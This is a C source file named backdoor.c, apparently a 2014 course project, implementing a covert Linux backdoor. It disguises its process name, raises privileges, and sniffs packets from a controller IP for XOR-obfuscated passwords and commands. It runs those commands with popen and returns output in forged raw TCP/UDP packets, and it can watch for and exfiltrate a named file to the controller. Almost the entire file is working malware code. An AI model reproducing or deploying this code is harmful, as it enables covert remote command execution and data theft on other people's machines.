/*---------------------------------------------------------------------------------------
--      Source File:            backdoor.c
--
--      Functions:              main()
--								int startPacketCap();
--								void packetRecieved(u_char*, const struct pcap_pkthdr*, const u_char*);
--								int acceptCommand(int, unsigned long);
--								void usage (char **argv);
--
--      Date:                   October 6, 2014
--
--      Revisions:              (Date and Description)
--                                      
--      Designer:               Cole Rees and David Tran
--                              
--      Programmer:             Cole Rees and David Tran
--
--		This program illustrates the use of the TCP/IP protocol suite being used to create a backdoor 
-- 		on a Linux machine that will take command line commands from an external controller and then 
-- 		return the results to the controller. The backdoor will only respond to the controller that 
-- 		supplies it with the correct password.
--
--
--      To compile the application:
--                      
--            	make clean
--				make
-- 
--	To run the application:
--	
--		./backdoor
--
---------------------------------------------------------------------------------------*/
#include "backdoor.h"

int main(int argc, char *argv[])
{
	/* mask the process name */
	memset(argv[0], 0, strlen(argv[0]));	
	strcpy(argv[0], MASK);
	prctl(PR_SET_NAME, MASK, 0, 0);

	/* change the UID/GID to 0 (raise privs) */
	setuid(0);
	setgid(0);
	
	if(startPacketCap() == 0)
	{
		return 0;
	}
	return 1;
}

int startPacketCap() { 
    pcap_if_t *all_dev, *d; 
    struct bpf_program fp;
    char errbuf[PCAP_ERRBUF_SIZE];
    char *cfilter = malloc(sizeof(char) * 512);
   	pcap_t* nic_descr;
   	bpf_u_int32 netp;
    bpf_u_int32 maskp;
    
   	snprintf(cfilter, 512, "src %s and src port %s", FILTER_IP, FILTER_PORT);

	if (pcap_findalldevs(&all_dev, errbuf) == -1)
    {
		fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
		return 0;
	}
	
	//Find a suitable nic from the device list
    for (d = all_dev; d; d = d->next)
    {
		if (d->addresses != NULL)
		{
			break;
		}
    }
	// Use pcap to get the IP address and subnet mask of the device 
	pcap_lookupnet (d->name, &netp, &maskp, errbuf);
    	
	// open device for reading 
	nic_descr = pcap_open_live (d->name, BUFSIZ, 0, -1, errbuf);
	if (nic_descr == NULL)
	{ 
		printf("pcap_open_live(): %s\n",errbuf); 
		return 0; 
	}
	
	// We only want traffic from the machine that will be sending inputs
	if (pcap_compile (nic_descr, &fp, cfilter, 0, netp) == -1)
	{ 
		fprintf(stderr,"Error calling pcap_compile\n"); 
		exit(1);
	}
	
	// We only want traffic from the machine that will be sending inputs
	if (pcap_setfilter (nic_descr, &fp) == -1)
	{ 
		fprintf(stderr,"Error setting filter\n"); 
		exit(1); 
	}

	// Call pcap_loop(..) and pass in the callback function 
	pcap_loop(nic_descr, -1, packetRecieved, NULL);

	/* cleanup */
	pcap_freecode(&fp);
	pcap_close(nic_descr);

	return 1;
}

void packetRecieved(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	/* declare pointers to packet headers */
	struct ethhdr *ethernet_header;
	struct iphdr *ip_header;
	struct tcphdr *tcp_header; 
	int len;
	int size_ip;
	int size_tcp;
	char *encryptedPass = malloc(sizeof(char) * 4);
	char *deCryptPassword = malloc(sizeof(char) * 4);
	char *encryptedCmd = malloc(sizeof(char) * 52);
	char *deCryptCmd = malloc(sizeof(char) * 52);
	char *key = NULL;
	int cmdType = 0;
	char cmdInfo[PATH_MAX];
	
	
	if ((len = (sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr))) > 40)
	{
		ethernet_header = (struct ethhdr *)packet;
		if(ntohs(ethernet_header->h_proto) == ETH_P_IP)
		{
			ip_header = (struct iphdr *)(packet + sizeof(struct ethhdr));

			if(ip_header->protocol == IPPROTO_TCP)
			{
				tcp_header = (struct tcphdr*)(packet + sizeof(struct ethhdr) + ip_header->ihl*4);
				/* Print the Dest and Src ports */
				if(ntohl(tcp_header->ack_seq) == 0) {
				} else {
					return;
				}
				
				//Get Password
				size_ip = ip_header->ihl*4;
				memcpy(encryptedPass, (packet + SIZE_ETHERNET + size_ip + 4), sizeof(__uint32_t));
				key = strdup(encryptKey);
				deCryptPassword = xor_encrypt(key, encryptedPass, 4);
				printf("Password Received: ");
				printf("%s\n", deCryptPassword);
				
				//Get command
				size_tcp = tcp_header->doff * 4;
				encryptedCmd = (char *)(packet + SIZE_ETHERNET + size_ip +  size_tcp);
				key = strdup(encryptKey);
				deCryptCmd = xor_encrypt(key, encryptedCmd, (ntohs(ip_header->tot_len) - (size_ip + size_tcp)));
				printf("Cmd Received: ");
				printf("%s\n", deCryptCmd);
				
				 if(strncmp(deCryptPassword, password, 4) != 0)
				{
					fprintf(stderr, "password does not match\n");
					return;
				}
				
				//Parse command type and command info from the packet we received from the controller
				sscanf(deCryptCmd, "%d|%s", &cmdType, cmdInfo);
				if (cmdType == 1) {
					runCommandLineArg(ntohs(tcp_header->source), ip_header->saddr, ntohs(tcp_header->dest), ip_header->daddr, cmdInfo);
				} else if (cmdType == 2){
					getFile(ntohs(tcp_header->source), ip_header->saddr, ntohs(tcp_header->dest), ip_header->daddr, cmdInfo);
				} else {
					printf("Bad command\n");
				}
			} else
			{
				printf("Not a TCP packet\n");
			}
		}
		else
		{
			printf("Not an IP packet\n");
		}	
	}
	else
	{
		printf("TCP Header not present \n");
	}
}

int runCommandLineArg(int sourcePort, unsigned long sourceIp, int destPort, unsigned long destIp, char *command)
{
	char *packetBuf = NULL;
	int sock = 0;
    FILE *pf;
    char data[4];
    struct sockaddr_in din;
    
	sleep(1);
	
    din.sin_family = AF_INET;
    din.sin_port = htons(sourcePort);
    din.sin_addr.s_addr = (sourceIp);
    
	printf("Command: %s\n", command);
	
	if (strcmp("TCP", SEND_PACKET_TYPE) == 0)
	{
		sock = createTCPSocket();
	} else if (strcmp("UDP", SEND_PACKET_TYPE) == 0)
	{
		sock = createUDPSocket();
	} else 
	{
		fprintf(stderr, "Could not determine SEND_PACKET_TYPE.\n");
		return -1;
	}
 
    // Setup our pipe for reading and execute our command.
    pf = popen(command,"r"); 
 
    if(!pf){
      fprintf(stderr, "Could not open pipe for output.\n");
      return -1;
    }
    
    // Grab data from process execution
    while(fgets(data, 4 , pf) != NULL) {
		// Print grabbed data to the screen.
		fprintf(stdout, "%s",data); 
		
		if (strcmp("TCP", SEND_PACKET_TYPE) == 0)
		{
			packetBuf = createTCPPacket(sourcePort, sourceIp, destPort, destIp, data);
			sendto(sock, packetBuf, (sizeof(struct ip) + sizeof(struct tcphdr)), 0, (struct sockaddr *) &din, sizeof(din));
			sleep(1);
		} else if (strcmp("UDP", SEND_PACKET_TYPE) == 0)
		{
			packetBuf = createUDPPacket(sourcePort, sourceIp, destPort, destIp, data);
			sendto(sock, packetBuf, (sizeof(struct ip) + sizeof(struct udphdr)), 0, (struct sockaddr *) &din, sizeof(din));
			sleep(1);
		}
	}
    if (pclose(pf) != 0)
        fprintf(stderr," Error: Failed to close command stream \n");
    free(packetBuf);
	return 0;
}

int getFile(int sourcePort, unsigned long sourceIp, int destPort, unsigned long destIp, char *command)
{
	
	char* ts1 = strdup(command);
	char* ts2 = strdup(command);

	char* dir = dirname(ts1);
	char* filename = basename(ts2);
	
	int len, i, ret, fd, wd;
	//struct timeval time;
	static struct inotify_event *event;
	fd_set rfds;
	char buf[BUF_LEN];

	fd = inotify_init();
	if (fd < 0)
		perror ("inotify_init");
	
	wd = inotify_add_watch (fd, dir, (uint32_t)IN_CLOSE_WRITE);
	
	if (wd < 0)
		perror ("inotify_add_watch");

	FD_ZERO (&rfds);
	FD_SET (fd, &rfds);

	while (!doneflag)
	{
		ret = select (fd + 1, &rfds, NULL, NULL, NULL);
		len = read (fd, buf, BUF_LEN);
	
		i = 0;
		if (len < 0) 
		{
        		if (errno == EINTR) /* need to reissue system call */
				perror ("read");
        		else
                		perror ("read");
		} 
		else if (!len) /* BUF_LEN too small? */
		{
			printf ("buffer too small!\n");
			exit (1);
		}

		while (i < len) 
		{
        		//struct inotify_event *event;
        		event = (struct inotify_event *) &buf[i];

        		printf ("\nwd=%d mask=%u cookie=%u len=%u\n", event->wd, event->mask, event->cookie, event->len);
        		if (event->len)
                		printf ("name=%s\n", event->name);
        		i += EVENT_SIZE + event->len;
		}
	
		if (ret < 0)
			perror ("select");
		else if (!ret)
			printf ("timed out\n");
		else if (FD_ISSET (fd, &rfds))
		{
			print_mask (event->mask);
		}
		
		if ((event->mask & IN_CLOSE) && (strcmp(filename, event->name) == 0)) {
				doneflag = TRUE;
				break;
		}
	}
	
	fflush (stdout);
	ret = inotify_rm_watch (fd, wd);
	if (ret)
		perror ("inotify_rm_watch");
	if (close(fd))
		perror ("close");
		
	sendFile(sourcePort, sourceIp, destPort, destIp, command);
	return 0;
}

int sendFile(int sourcePort, unsigned long sourceIp, int destPort, unsigned long destIp, char *command) {
	//TCP
	int sd;
	struct	sockaddr_in controllerSocket;
    char data[80];
    //UDP
	int sockfd;
	struct sockaddr_in servaddr;
	char sendline[80];
    //GENERAL
    FILE *pf;
    char *encryptedData = NULL;
    char *key = NULL;
    
   system("sh knockKnock.sh");
    
    //sleep(1);
    
	printf("File: %s\n", command);
	
	if (strcmp("TCP", SEND_PACKET_TYPE) == 0)
	{
		if ((sd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		{
			fprintf(stderr, "Can't create a socket\n");
			return -1;
		}
		bzero((char *)&controllerSocket, sizeof(struct sockaddr_in));
		controllerSocket.sin_family = AF_INET;
		controllerSocket.sin_port = htons(sourcePort);
		controllerSocket.sin_addr.s_addr = sourceIp;	
		
		//Make a connection to the controller
		if(connect(sd, (struct sockaddr *)&controllerSocket, sizeof(controllerSocket)) == -1)
		{
			   fprintf(stderr, "can't connect to server\n");
			   return -1;
		}
		
		pf = fopen (command, "rt"); 
 
		if(!pf){
		  fprintf(stderr, "Could not open pipe for output.\n");
		  return -1;
		}
		
		// Grab data from process execution
		while(fgets(data, 80 , pf) != NULL) {
			// Print grabbed data to the screen.
			fprintf(stdout, "TCP: %s",data); 
			key = strdup(encryptKey);
			encryptedData = xor_encrypt(key, data, 80);
			send(sd, encryptedData, 80, 0);
		}
		if (pclose(pf) != 0)
			fprintf(stderr," Error: Failed to close command stream \n");
		
		close(sd);
	} else if (strcmp("UDP", SEND_PACKET_TYPE) == 0)
	{
		sockfd=socket(AF_INET,SOCK_DGRAM,0);

		bzero(&servaddr,sizeof(servaddr));
		servaddr.sin_family = AF_INET;
		servaddr.sin_addr.s_addr=sourceIp;
		servaddr.sin_port=htons(sourcePort);
		
		pf = fopen (command, "rt"); 
 
		if(!pf){
			fprintf(stderr, "Could not open pipe for output.\n");
			return -1;
		}
		while (fgets(sendline, 80 ,pf) != NULL)
		{
			fprintf(stdout, "UDP: %s",sendline); 
			key = strdup(encryptKey);
			encryptedData = xor_encrypt(key, sendline, 80);
			sendto(sockfd,encryptedData,80, 0, (struct sockaddr *)&servaddr,sizeof(servaddr)); 
            //sendto(sockfd,sendline,strlen(sendline),0,
            //(struct sockaddr *)&servaddr,sizeof(servaddr));
		}
	} else 
	{
		fprintf(stderr, "Could not determine SEND_PACKET_TYPE.\n");
		return -1;
	}
	return 0;
}


/*int sendFile(int sourcePort, unsigned long sourceIp, int destPort, unsigned long destIp, char *command) {

	char *packetBuf = NULL;
	int sock = 0;
    FILE *pf;
    char data[4];
    struct sockaddr_in din;
    
	sleep(1);
    din.sin_family = AF_INET;
    din.sin_port = htons(sourcePort);
    din.sin_addr.s_addr = (sourceIp);
    
	printf("File: %s\n", command);
	
	if (strcmp("TCP", SEND_PACKET_TYPE) == 0)
	{
		sock = createTCPSocket();
		//packetBuf = createTCPPacket(sourcePort, sourceIp, destPort, destIp);
	} else if (strcmp("UDP", SEND_PACKET_TYPE) == 0)
	{
		sock = createUDPSocket();
		//packetBuf = createUDPPacket(sourcePort, sourceIp, destPort, destIp);
	} else 
	{
		fprintf(stderr, "Could not determine SEND_PACKET_TYPE.\n");
		return -1;
	}
	
	pf = fopen (command, "rt"); 
 
    if(!pf){
      fprintf(stderr, "Could not open pipe for output.\n");
      return -1;
    }
    
    // Grab data from process execution
    while(fgets(data, 4 , pf) != NULL) {
		// Print grabbed data to the screen.
		fprintf(stdout, "%s",data); 
		
		if (strcmp("TCP", SEND_PACKET_TYPE) == 0)
		{
			packetBuf = createTCPPacket(sourcePort, sourceIp, destPort, destIp, data);
			sendto(sock, packetBuf, (sizeof(struct ip) + sizeof(struct tcphdr)), 0, (struct sockaddr *) &din, sizeof(din));
			sleep(1);
		} else if (strcmp("UDP", SEND_PACKET_TYPE) == 0)
		{
			packetBuf = createUDPPacket(sourcePort, sourceIp, destPort, destIp, data);
			sendto(sock, packetBuf, (sizeof(struct ip) + sizeof(struct udphdr)), 0, (struct sockaddr *) &din, sizeof(din));
			sleep(1);
		}
	}
    if (pclose(pf) != 0)
        fprintf(stderr," Error: Failed to close command stream \n");
    free(packetBuf);
	return 0;
}*/

//Create a TCP socket for sending
int createTCPSocket() {
	int sock = 0;
	int one = 1;
    const int *val = &one;
    
	//Create socket
    sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == -1)
    {
        fprintf(stderr,"Error\n");
        return -1;
    }
    
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
		fprintf(stderr,"Error\n");
        return -1;
    }
    return sock;
}

//Create a TDP socket for sending
int createUDPSocket() {
		int sock = 0;
	int one = 1;
    const int *val = &one;
    
	//Create socket
    sock = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock == -1)
    {
        fprintf(stderr,"Error\n");
        return -1;
    }
    
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        fprintf(stderr,"Error\n");
        return -1;
    }
    return sock;
}
char *createTCPPacket(int sourcePort, unsigned long sourceIp, int destPort, unsigned long destIp, char *data) {
	char *packetBuf = NULL;
    struct iphdr *iph = NULL;
    struct tcphdr *tcph = NULL;
    struct sockaddr_in sin;
    struct sockaddr_in din;
    char *encryptedData = NULL;
    char *key = NULL;

    packetBuf = malloc(sizeof(struct ip) + sizeof(struct tcphdr));

    //Compute Packet length
    iph = (struct iphdr *) packetBuf;
    tcph = (struct tcphdr *) (packetBuf + sizeof(struct ip));
    
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    sin.sin_port = htons(sourcePort);
    din.sin_port = htons(destPort);
    sin.sin_addr.s_addr = sourceIp;
    din.sin_addr.s_addr = destIp;
  
    memset(packetBuf, 0, sizeof(struct ip) + sizeof(struct tcphdr));
    
    //IP
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph->id = htonl(rand()%65354);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = 6;
    iph->check = 0;
    iph->saddr = din.sin_addr.s_addr;
    iph->daddr = sin.sin_addr.s_addr;
    
    //Add encrypted data to packet
    key = strdup(encryptKey);
    encryptedData = xor_encrypt(key, data, 4);
    memcpy(packetBuf + sizeof(struct ip) + 4, encryptedData, sizeof(unsigned long));

    //TCP
    tcph->source = htons(destPort);
    tcph->dest = htons(sourcePort);    
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(32767);
    tcph->check = 0;
    tcph->urg_ptr = 0;
    
    //Set the checksum
	iph->check = in_cksum((unsigned short *)packetBuf, 5);
	
	return packetBuf;
}

char *createUDPPacket(int sourcePort, unsigned long sourceIp, int destPort, unsigned long destIp, char *data) {
	char *packetBuf = NULL;
    struct iphdr *iph = NULL;
    struct udphdr *udph = NULL;
    struct sockaddr_in sin;
    struct sockaddr_in din;
    char *encryptedData = NULL;
    char *key = NULL;

    packetBuf = malloc(sizeof(struct ip) + sizeof(struct udphdr));

    //Compute Packet length
    iph = (struct iphdr *) packetBuf;
    udph = (struct udphdr *) (packetBuf + sizeof(struct ip));
    
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    sin.sin_port = htons(sourcePort);
    din.sin_port = htons(destPort);
    sin.sin_addr.s_addr = sourceIp;
    din.sin_addr.s_addr = destIp;
  
    memset(packetBuf, 0, sizeof(struct ip) + sizeof(struct udphdr));
    
    //IP
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct ip) + sizeof(struct udphdr);
    iph->id = htonl(rand()%65354);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = 17;
    iph->check = 0;
    iph->saddr = din.sin_addr.s_addr;
    iph->daddr = sin.sin_addr.s_addr;
    
    //UDP
    udph->source = htons(destPort);
    udph->dest = htons(sourcePort);    
    udph->check = 0;
    udph->len = htons(sizeof(struct udphdr));
	
	//Add data to packet
	key = strdup(encryptKey);
	encryptedData = xor_encrypt(key, data, 4);
    memcpy(packetBuf + sizeof(struct ip) + 4, encryptedData, sizeof(unsigned long));
    
	  //Set the checksum
	iph->check = in_cksum((unsigned short *)packetBuf, sizeof(struct ip) + sizeof(struct udphdr));
	
	return packetBuf;
}

unsigned short in_cksum(unsigned short *buf, int len) {
	unsigned long sum;
    for (sum = 0; len > 0; len--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short) (~sum);
}

/*static void set_done_flag (int signo)
{
	doneflag = TRUE;
}*/

void print_mask(int mask)
{
        if (mask & IN_ACCESS)
                printf("ACCESS ");
        if (mask & IN_MODIFY)
                printf("MODIFY ");
        if (mask & IN_ATTRIB)
                printf("ATTRIB ");
        if (mask & IN_CLOSE)
                printf("CLOSE ");
        if (mask & IN_OPEN)
                printf("OPEN ");
        if (mask & IN_MOVED_FROM)
                printf("MOVE_FROM ");
        if (mask & IN_MOVED_TO)
                printf("MOVE_TO ");
        if (mask & IN_DELETE)
                printf("DELETE ");
        if (mask & IN_CREATE)
                printf("CREATE ");
        if (mask & IN_DELETE_SELF)
                printf("DELETE_SELF ");
        if (mask & IN_UNMOUNT)
                printf("UNMOUNT ");
        if (mask & IN_Q_OVERFLOW)
                printf("Q_OVERFLOW ");
        if (mask & IN_IGNORED)
                printf("IGNORED " );

        if (mask & IN_ISDIR)
                printf("(dir) ");
        else
                printf("(file) ");

        printf("0x%08x\n", mask);
}

// Usage Message
void usage (char **argv)
{
      fprintf(stderr, "Usage: %s\n", argv[0]);
      fprintf(stderr, "Example: %s\n", argv[0]);
      exit(1);
}

